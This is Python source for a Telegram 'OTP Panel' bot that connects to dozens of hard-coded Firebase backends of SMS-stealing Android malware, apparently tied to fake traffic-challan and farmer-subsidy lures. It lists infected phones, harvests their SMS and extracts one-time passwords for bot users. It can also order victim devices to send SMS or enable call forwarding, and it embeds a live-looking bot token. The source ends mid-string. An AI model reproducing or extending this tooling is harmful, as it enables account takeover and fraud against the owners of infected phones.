#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
        OTP PANEL BOT — ACCESS CONTROLLED EDITION
  Panel-wise Numbers + Access System + Emoji Names
══════════════════════════════════════════════════════
"""

import os
import re
import gc
import time
import json
import asyncio
import logging
from datetime import datetime, timedelta
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import Forbidden, TelegramError
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.WARNING,
)

# ═══════════════════════════════════════════════════════
#  CONFIG (UPDATED: REMOVED ALPHA_A23 AND RND12_17508)
# ═══════════════════════════════════════════════════════

DEFAULT_DATABASES = {
    "👑 BOSS_R1": "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "👑 BOSS_R2": "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "⚡ ALPHA_A2": "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "🔥 ALPHA_A5": "https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "⚔️ ALPHA_A12": "https://fir-1fa16-default-rtdb.firebaseio.com",
    "🎯 ALPHA_A19": "https://u40179853-987df-default-rtdb.firebaseio.com",
    "🔫 ALPHA_A21": "https://u62803313-e54bc-default-rtdb.firebaseio.com",
    "🦾 ALPHA_A24": "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
    "🏹 ALPHA_A27": "https://u8208372-ad1d1-default-rtdb.firebaseio.com",
    "🌪 ALPHA_A29": "https://u25428732-91bd9-default-rtdb.firebaseio.com",
    "💥 ALPHA_A31": "https://u72749819-fa563-default-rtdb.firebaseio.com",
    "🩸 ALPHA_A32": "https://u24143844-c1b11-default-rtdb.firebaseio.com",
    "👹 ALPHA_A33": "https://u72328193-47b68-default-rtdb.firebaseio.com",
    "🎭 ALPHA_A34": "https://u58325342-dffc0-default-rtdb.firebaseio.com",
    "⛓ ALPHA_A35": "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "🧿 ALPHA_A36": "https://u24153206-5eef6-default-rtdb.firebaseio.com",
    "💵 MAFIA_M7": "https://rto-47-b39f4-default-rtdb.firebaseio.com",
    "💰 MAFIA_M15_1": "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "💎 MAFIA_M15_2": "https://ai-rto-9-default-rtdb.firebaseio.com",
    "✨ VIP_EXTRA": "https://s85138920-87594-default-rtdb.firebaseio.com",
    "📦 FORTY_DATA": "https://fortydata-fee65-default-rtdb.firebaseio.com",
    "📡 FPRO_INDUS": "https://fpro3indus-default-rtdb.firebaseio.com",
    "🚨 JAMTARA_181": "https://jamtara181-default-rtdb.firebaseio.com",
    "🛸 PMS_JDJ": "https://pmsjdj-default-rtdb.firebaseio.com",
    "💻 MY_CARRY": "https://cs6mycarry68jh-default-rtdb.firebaseio.com",
    "🃏 RANDI_RONA": "https://randi-rona-81876-default-rtdb.firebaseio.com",
    "🚔 RTO_CHALLAN_A": "https://rtochallan-8579d-default-rtdb.firebaseio.com",
    "🛑 RTO_CHALLAN_B": "https://rtochallan8-default-rtdb.firebaseio.com",
    "🐾 JAMTARA_140": "https://jamtara140-73bf7-default-rtdb.firebaseio.com",
    "🔮 GGGGGG_NODE": "https://gggggg-979bd-default-rtdb.firebaseio.com",
    # ── Naye Panels ──────────────────────────────────────
    "🟣 CSFORME_DC64A": "https://csforme-dc64a-default-rtdb.firebaseio.com",
    "🔵 SANJEE_9918A": "https://sanjee-9918a-default-rtdb.firebaseio.com",
    "🟤 BITTU_2D39E": "https://bittu-2d39e-default-rtdb.firebaseio.com",
    "😈 DEMON_4": "https://demon-4-default-rtdb.firebaseio.com",
    "🐕 DOGLA_DE225": "https://dogla-de225-default-rtdb.firebaseio.com",
    "🎲 RANDO_ACF5A": "https://rando-acf5a-default-rtdb.firebaseio.com",
    "🅰️ AAAA_B3749": "https://aaaa-b3749-default-rtdb.firebaseio.com",
    "🧩 AJAY_33C1B": "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "🌾 PM_KISAN_13GFH": "https://pm-kisan-13gfh-default-rtdb.firebaseio.com",
    "6️⃣ SERVER_6_42C3B": "https://server-6-42c3b-default-rtdb.firebaseio.com",
    "🌱 PM_KISHAN_23GUG": "https://pm-kishan-23gug-default-rtdb.firebaseio.com",
    "🔛 GO_ONE_1B6B2": "https://go-one-1b6b2-default-rtdb.firebaseio.com",
    "♻️ RC_39_15": "https://rc-39-15-default-rtdb.firebaseio.com",
    "📋 PANEL_WALA_V70": "https://panel-wala-v70-default-rtdb.firebaseio.com",
    "🌀 UDKUDJUDJ": "https://udkudjudj-default-rtdb.firebaseio.com",
    "🌐 YOURFIREBASE": "https://yourfirebase-default-rtdb.firebaseio.com",
    "👨 RAJ254346KUMAR": "https://raj254346kumar-84033-default-rtdb.firebaseio.com",
    "📋 PANEL_WALA_V11": "https://panel-wala-v11-default-rtdb.firebaseio.com",
    "🦀 CRAXS_4C542": "https://craxs-4c542-default-rtdb.firebaseio.com",
    "⛓ U75887828_B5A63": "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "👁 AJNA_20FC4": "https://ajna-20fc4-default-rtdb.firebaseio.com",
    "🙏 RAMESHWAR_7OKT": "https://rameshwar-7okt-default-rtdb.firebaseio.com",
    "📱 MYAPP_8228A": "https://myapp-8228a-default-rtdb.firebaseio.com",
    "🏆 E5TURNAMENT2": "https://e5turnament2-default-rtdb.firebaseio.com",
    "🌊 RAKI143AA": "https://raki143aa-default-rtdb.firebaseio.com",
    "🚗 RTO91_2B27F": "https://rto91-2b27f-default-rtdb.firebaseio.com",
    "😫 PAINISLV": "https://painislv-default-rtdb.firebaseio.com",
    "⚡ STROM_90E84": "https://strom-90e84-default-rtdb.firebaseio.com",
    "🍆 LODA_5029E": "https://loda-5029e-default-rtdb.firebaseio.com",
    "⚓ ANKUR_2511F": "https://ankur-2511f-default-rtdb.firebaseio.com",
    "🔷 U62751482_F5B46": "https://u62751482-f5b46-default-rtdb.firebaseio.com",
    "🔥 FIR_27C9E": "https://fir-27c9e-default-rtdb.firebaseio.com",
    "☁️ KUMARLIVE1": "https://kumarlive1-default-rtdb.firebaseio.com",
}

DATABASES = dict(DEFAULT_DATABASES)

POLL_INTERVAL  = 15
SMS_LIMIT      = 10
DB_CONCURRENCY = 50
TOKEN          = "8899754944:AAHQbx-_3glcYQtOptR1ID1wHK02vTrvdwQ"
BOT_USERNAME   = "Otp4y545bot"
DB_FILE        = "bot_database.json"

ADMIN_IDS: set[int] = {
    8819228820,
}

# ═══════════════════════════════════════════════════════
#  GLOBAL STATE
# ═══════════════════════════════════════════════════════

seen_ids: set[str] = set()
MAX_SEEN_IDS = 50000
first_run: bool = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
chats_registry: set[int] = set()

allowed_users: set[int] = set()
ADMIN_ONLY_TAGS: set[str] = set()
user_focus: dict[int, str] = {}
user_page: dict[int, int] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}
pending_kw_confirm: dict[int, str] = {}   # chat_id → keyword (waiting for confirm)

# ═══════════════════════════════════════════════════════
#  ACCESS CONTROL HELPERS
# ═══════════════════════════════════════════════════════

def has_access(user_id: int) -> bool:
    return user_id in ADMIN_IDS or user_id in allowed_users

def grant_access(user_id: int) -> None:
    allowed_users.add(user_id)
    save_data()

def revoke_access(user_id: int) -> None:
    allowed_users.discard(user_id)
    save_data()

# ═══════════════════════════════════════════════════════
#  DATA SAVING & LOADING
# ═══════════════════════════════════════════════════════

def save_data():
    try:
        data_to_dump = {
            "all_users": all_users,
            "DATABASES": DATABASES,
            "allowed_users": list(allowed_users),
            "admin_only_tags": list(ADMIN_ONLY_TAGS),
        }
        with open(DB_FILE, "w") as f:
            json.dump(data_to_dump, f, indent=4)
    except Exception as e:
        tlog(f"Save Data Error: {e}")

def load_data():
    global all_users, DATABASES, allowed_users, ADMIN_ONLY_TAGS
    DATABASES = dict(DEFAULT_DATABASES)
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                loaded_users = data.get("all_users", {})
                for k, v in loaded_users.items():
                    all_users[int(k)] = v
                saved_dbs = data.get("DATABASES", {})
                if saved_dbs:
                    merged = dict(DEFAULT_DATABASES)
                    merged.update(saved_dbs)
                    # Force delete removed ones from loaded data too
                    merged.pop("☠️ ALPHA_A23", None)
                    merged.pop("🔢 RND12_17508", None)
                    DATABASES = merged
                saved_allowed = data.get("allowed_users", [])
                allowed_users = set(int(u) for u in saved_allowed)
                ADMIN_ONLY_TAGS = set(data.get("admin_only_tags", []))
        except Exception as e:
            tlog(f"Load Data Error: {e}")

async def auto_save_loop():
    while True:
        await asyncio.sleep(60)
        save_data()

# ═══════════════════════════════════════════════════════
#  ANTI-SPAM
# ═══════════════════════════════════════════════════════

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return False
    now = time.time()
    last_click = user_cooldowns.get(user_id, 0)
    if now - last_click < 0.5:
        return True
    user_cooldowns[user_id] = now
    return False

def tlog(msg: str) -> None:
    t = datetime.now().strftime("%I:%M:%S %p")
    print(f"[{t}]  {msg}", flush=True)

# ═══════════════════════════════════════════════════════
#  FIREBASE HELPERS
# ═══════════════════════════════════════════════════════

_FB_TIMEOUT = aiohttp.ClientTimeout(total=4, connect=2)

async def _get_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, keepalive_timeout=30)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=_FB_TIMEOUT)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        session = await _get_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json"
        async with session.get(url) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception:
        return None

async def fb_keys(path: str, base: str) -> list[str]:
    try:
        session = await _get_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url) as r:
            if r.status != 200: return []
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except Exception:
        return []

async def fb_patch(path: str, payload: dict, base: str) -> bool:
    try:
        session = await _get_session()
        async with session.patch(f"{base}/{path}.json", json=payload) as r:
            return r.status == 200
    except Exception:
        return False

# ═══════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════

def html_escape(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", n)
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})",        re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})",       re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})",   re.IGNORECASE),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_str(val) -> str:
    if not val: return "offline"
    return "online" if str(val).lower() == "online" else "offline"

def parse_status_bool(val) -> str:
    return "online" if val is True else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

async def write_call_forward(device, forward_to: str) -> bool:
    if device.sms_path.endswith("receivedSms"):
        payload = {"callForwardingEnabled": True, "forwardToNumber": forward_to, "simSlotIndex": 0}
        ok = await fb_patch(f"{device.id}/callForwarding", payload, device.base_url)
    else:
        payload = {"callForward": forward_to, "timestamp": int(time.time() * 1000), "status": "pending"}
        ok = await fb_patch(f"device_commands/{device.id}", payload, device.base_url)
    return ok

async def write_send_sms(device, to: str, body: str) -> bool:
    if device.sms_path.endswith("receivedSms"):
        payload = {"message": body, "targetNumber": to, "simSlot": 0}
        ok = await fb_patch(f"{device.id}/sendSms", payload, device.base_url)
    else:
        payload = {"sendSms": {"to": to, "body": body}, "timestamp": int(time.time() * 1000), "status": "pending"}
        ok = await fb_patch(f"device_commands/{device.id}", payload, device.base_url)
    return ok

# ═══════════════════════════════════════════════════════
#  DATA CLASSES & ASYNC FIREBASE ENGINE
# ═══════════════════════════════════════════════════════

PAGE_SIZE = 20

class Device:
    __slots__ = (
        "id", "name", "status", "battery", "timestamp",
        "numbers", "device_info", "sms_path", "base_url", "db_tag"
    )
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag):
        self.id = id; self.name = name; self.status = status
        self.battery = battery; self.timestamp = timestamp; self.numbers = numbers
        self.device_info = device_info; self.sms_path = sms_path
        self.base_url = base_url; self.db_tag = db_tag

async def fetch_db_data(tag: str, url: str) -> list[Device]:
    devices_list = []
    added_set = set()
    try:
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url),
            fb_get("All_Users/simDetails", url),
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url),
            fb_get("clients", url),
        )
        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                info = info_all.get(dev_id) or {}
                nums = []
                for field in ("sim1Number", "sim2Number"):
                    n = (sim or {}).get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4: nums.append(fmt_num(str(n)))
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_str(info.get("Status")),
                    battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or 0),
                    numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag
                ))
        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set or not isinstance(data, dict): continue
                added_set.add(dev_id)
                nums = []
                for field in ("numberSim1", "numberSim2", "mobNo"):
                    n = data.get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4: nums.append(fmt_num(str(n)))
                devices_list.append(Device(
                    id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
                    status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")),
                    timestamp=int(data.get("timestamp") or 0), numbers=nums,
                    device_info=data.get("Device_info") or f"Device ID: {dev_id}",
                    sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag
                ))
        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set or not isinstance(client, dict): continue
                nums = []
                mob = client.get("mobNo") or ""
                if mob and len(re.sub(r"\D", "", mob)) > 5: nums.append(fmt_num(mob))
                elif client.get("sims") and isinstance(client["sims"], list) and client["sims"]:
                    ph = (client["sims"][0] or {}).get("phoneNumber") or ""
                    if ph and len(re.sub(r"\D", "", ph)) > 5: nums.append(fmt_num(ph))
                if not nums and not client.get("modelName"): continue
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_bool(client.get("status")),
                    battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
                    device_info=f"Model: {model}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag
                ))
        if root_keys:
            type4_keys = [k for k in root_keys if len(k) == 16 and re.match(r"^[0-9a-fA-F]+$", k)]
            if type4_keys:
                async def fetch_t4(k):
                    return k, await fb_get(f"{k}/deviceInfo", url), await fb_get(f"{k}/simInfo", url), await fb_get(f"{k}/heartbeat", url)
                t4results = await asyncio.gather(*(fetch_t4(k) for k in type4_keys))
                for k, info, sim, hb in t4results:
                    if not isinstance(info, dict) or k in added_set: continue
                    added_set.add(k)
                    nums = []
                    if isinstance(sim, dict):
                        for sim_v in sim.values():
                            if isinstance(sim_v, dict):
                                n = sim_v.get("number", "")
                                if n and len(re.sub(r"\D", "", n)) > 4: nums.append(fmt_num(n))
                    model = info.get("model") or info.get("brand") or f"Device-{k[:6]}"
                    ts = int(hb) if isinstance(hb, (int, float)) else 0
                    status = "online" if ts and (time.time() * 1000 - ts) < 300000 else "offline"
                    devices_list.append(Device(
                        id=k, name=model, status=status, battery=0, timestamp=ts, numbers=nums,
                        device_info=f"Model: {model}\nDevice ID: {k}", sms_path=f"{k}/receivedSms", base_url=url, db_tag=tag
                    ))
    except Exception:
        pass
    return devices_list

async def get_all_devices(is_admin: bool = True) -> list[Device]:
    devices = []
    for tag in DATABASES.keys():
        if not is_admin and tag in ADMIN_ONLY_TAGS:
            continue
        devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
    unique_devices = {}
    for d in devices:
        if d.id not in unique_devices: unique_devices[d.id] = d
    dev_list = list(unique_devices.values())
    dev_list.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if d.numbers else 1, -d.timestamp))
    return dev_list

async def get_panel_devices(tag: str, is_admin: bool = True) -> list[Device]:
    if not is_admin and tag in ADMIN_ONLY_TAGS:
        return []
    devices = list(GLOBAL_DEVICE_CACHE.get(tag, []))
    devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if d.numbers else 1, -d.timestamp))
    return devices

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

# ═══════════════════════════════════════════════════════
#  MESSAGE BUILDERS & UI
# ═══════════════════════════════════════════════════════

def get_reply_menu(is_admin: bool) -> ReplyKeyboardMarkup:
    keys = [
        [KeyboardButton("📱 Devices List"), KeyboardButton("🔍 Search Number")],
        [KeyboardButton("📊 Panel Status"), KeyboardButton("🔑 Recent OTPs")],
        [KeyboardButton("🗂 All Panels"), KeyboardButton("🔎 Keyword Search")],
        [KeyboardButton("📋 Number Search")],
    ]
    if is_admin:
        keys.append([KeyboardButton("🔍 Bulk Search"), KeyboardButton("📊 Bot Status")])
        keys.append([KeyboardButton("🛡 Admin Panel")])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def device_label(d: Device) -> str:
    return " & ".join(d.numbers) if d.numbers else f"{d.name} ({d.id[:8]})"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    online = sum(1 for d in devices if d.status == "online")
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    return (f"✨ OTP PANEL ✨\n━━━━━━━━━━━━━━━━━━\n"
            f"🟢 Online: {online}   🔴 Offline: {len(devices)-online}\n"
            f"📱 Total: {len(devices)} Devices\n📄 Page {page + 1} of {total_pages}\n"
            f"━━━━━━━━━━━━━━━━━━\nSelect a number below to connect:")

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    rows = []
    for d in devices[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]:
        icon = "🟢" if d.status == "online" else "🔴"
        lbl = f"{icon} 📱 [{d.db_tag}] {d.numbers[0]}" if d.numbers else f"{icon} ⚙️ [{d.db_tag}] {d.name}"
        rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("🟢 Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("🗂 All Panels", callback_data="panels"), InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online:
            lbl = f"🟢 📱 [{d.db_tag}] {d.numbers[0]}" if d.numbers else f"🟢 ⚙️ [{d.db_tag}] {d.name}"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("😴 Koi device online nahi", callback_data="noop")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="online"), InlineKeyboardButton("📋 All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def otp_in_date_range(sms: dict) -> bool:
    today = datetime.now().date()
    yesterday = today - timedelta(days=1)
    tomorrow  = today + timedelta(days=1)
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate") or ""
    if date_str:
        for fmt in ("%d %b %Y %I:%M %p", "%d/%m/%Y", "%Y-%m-%d", "%d-%m-%Y", "%d %b %Y"):
            try:
                parsed = datetime.strptime(date_str.strip()[:20], fmt).date()
                return parsed in (yesterday, today, tomorrow)
            except Exception:
                continue
    ts_raw = sms.get("timestamp")
    if ts_raw:
        try:
            ts = float(ts_raw)
            if ts > 1e11: ts /= 1000
            parsed = datetime.fromtimestamp(ts).date()
            return parsed in (yesterday, today, tomorrow)
        except Exception:
            pass
    return False

def bulksearch_panels_keyboard() -> InlineKeyboardMarkup:
    rows = []
    for tag in sorted(DATABASES.keys()):
        cached = GLOBAL_DEVICE_CACHE.get(tag, [])
        online = sum(1 for d in cached if d.status == "online")
        bar = "🟢" if online > 0 else "🔴"
        safe_tag = tag.replace(" ", "_").replace(":", "").replace("/", "")[:30]
        rows.append([InlineKeyboardButton(
            f"{bar} {tag} — {online} online",
            callback_data=f"bulksearch_panel:{safe_tag}"
        )])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def panels_list_keyboard(is_admin: bool = False) -> InlineKeyboardMarkup:
    rows = []
    for tag in sorted(DATABASES.keys()):
        if tag in ADMIN_ONLY_TAGS and not is_admin:
            continue
        cached = GLOBAL_DEVICE_CACHE.get(tag, [])
        total = len(cached)
        online = sum(1 for d in cached if d.status == "online")
        num_count = sum(len(d.numbers) for d in cached if d.numbers)
        bar = "🟢" if online > 0 else ("🔴" if total > 0 else "⚫")
        safe_tag = tag.replace(" ", "_").replace(":", "").replace("/", "")[:30]
        label = f"{bar} {tag} — {num_count} numbers"
        if is_admin and tag in ADMIN_ONLY_TAGS:
            label = "🔒 " + label
        rows.append([InlineKeyboardButton(label, callback_data=f"panel:{safe_tag}")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="panels"), InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def panel_numbers_text(tag: str, devices: list[Device]) -> str:
    online = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    lines = [
        f"📡 <b>{tag}</b>",
        f"━━━━━━━━━━━━━━━━━━",
        f"🟢 Online: {online}  🔴 Offline: {offline}  📱 Total: {len(devices)}",
        f"━━━━━━━━━━━━━━━━━━",
    ]
    if not devices:
        lines.append("📭 Is panel mein koi device nahi mila.")
    else:
        for i, d in enumerate(devices, 1):
            icon = "🟢" if d.status == "online" else "🔴"
            batt = f"🔋{d.battery}%" if d.battery else ""
            if d.numbers:
                nums_str = " | ".join(d.numbers)
                lines.append(f"{i}. {icon} {nums_str} {batt}")
            else:
                lines.append(f"{i}. {icon} ⚙️ {d.name[:20]} {batt}")
    return "\n".join(lines)

def panel_numbers_keyboard(tag: str, devices: list[Device]) -> InlineKeyboardMarkup:
    rows = []
    for d in devices[:25]:
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} {d.numbers[0]}"
            if len(d.numbers) > 1:
                lbl += f" & {d.numbers[1]}"
        else:
            lbl = f"{icon} ⚙️ {d.name[:20]}"
        rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data=f"panelref:{tag.replace(' ', '_').replace(':', '').replace('/', '')[:30]}"),
                 InlineKeyboardButton("🔙 Back", callback_data="panels")])
    return InlineKeyboardMarkup(rows)

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    lines = [f"🔑 OTP: <code>{otp}</code>"] if otp else []
    lines.append(f"👤 From: {sms.get('sender','Unknown')}\n📅 Date: {sms_date(sms)}")
    lines.append(f"📱 Number: {num_label}\n\n💬 Message: {body}")
    return "\n".join(lines), otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    return (f"✨ NEW OTP RECEIVED ✨\n━━━━━━━━━━━━━━━━━━\n"
            f"│ 🔢 OTP : <code>{otp}</code>\n│ 📱 Number : {num_label}\n"
            f"│ 👤 From : {sms.get('sender','Unknown')}\n│ 📅 Date : {sms_date(sms)}\n"
            f"━━━━━━━━━━━━━━━━━━\n💬 {body}")

def device_action_keyboard(dev_id: str, back_page: int = 0) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh OTP", callback_data=f"sel:{dev_id}"),
         InlineKeyboardButton("📩 View Last 10 SMS", callback_data=f"msgs:{dev_id}")],
        [InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{dev_id}"),
         InlineKeyboardButton("💬 Send SMS", callback_data=f"ss:{dev_id}")],
        [InlineKeyboardButton("🔙 Back", callback_data=f"pg:{back_page}"),
         InlineKeyboardButton("🗂 All Panels", callback_data="panels")],
    ])

def admin_panel_text() -> str:
    return (f"🛡 ADMIN PANEL\n━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total Users    : {len(all_users)}\n"
            f"✅ Allowed Users  : {len(allowed_users)}\n"
            f"📡 Active Chats   : {len(chats_registry)}\n"
            f"🗄 Connected DBs  : {len(DATABASES)}\n━━━━━━━━━━━━━━━━━━")

def admin_keyboard() -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton("➕ Add Panel URL (Bulk)", callback_data="admin_add_main_db")],
        [InlineKeyboardButton("✅ Grant Access", callback_data="admin_grant_access"),
         InlineKeyboardButton("❌ Revoke Access", callback_data="admin_revoke_access")],
        [InlineKeyboardButton("👥 User List", callback_data="admin_users"),
         InlineKeyboardButton("🔐 Access List", callback_data="admin_access_list")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
         InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh")],
        [InlineKeyboardButton("🔒 Set Admin Panel", callback_data="admin_setadmin_list")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")],
    ]
    return InlineKeyboardMarkup(keys)

def admin_setadmin_keyboard() -> InlineKeyboardMarkup:
    rows = []
    for tag in sorted(DATABASES.keys()):
        safe_tag = tag.replace(" ", "_").replace(":", "").replace("/", "")[:30]
        if tag in ADMIN_ONLY_TAGS:
            label = f"🔒 {tag} (Admin Only)"
        else:
            label = f"🔓 {tag}"
        rows.append([InlineKeyboardButton(label, callback_data=f"toggleadmin:{safe_tag}")])
    rows.append([InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_refresh"),
                 InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def admin_setadmin_text() -> str:
    locked = len(ADMIN_ONLY_TAGS)
    total  = len(DATABASES)
    return (f"🔒 <b>Admin-Only Panels</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔒 Hidden: {locked}  |  🔓 Visible: {total - locked}  |  📡 Total: {total}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Panel pe click karo → Admin-Only ON/OFF toggle ho jayega:")

async def safe_edit(query, text, reply_markup=None, parse_mode="HTML"):
    try:
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode,
                                      read_timeout=10, write_timeout=10)
    except Exception:
        pass

def find_tag_by_safe(safe_tag: str) -> Optional[str]:
    for tag in DATABASES.keys():
        st = tag.replace(" ", "_").replace(":", "").replace("/", "")[:30]
        if st == safe_tag:
            return tag
    return None

# ═══════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

NO_ACCESS_TEXT = (
    "🚫 <b>Access Denied</b>\n"
    "━━━━━━━━━━━━━━━━━━\n"
    "Aapko is bot use karne ki ijazat nahi hai.\n"
    "Admin se contact karein: @admin_username\n"
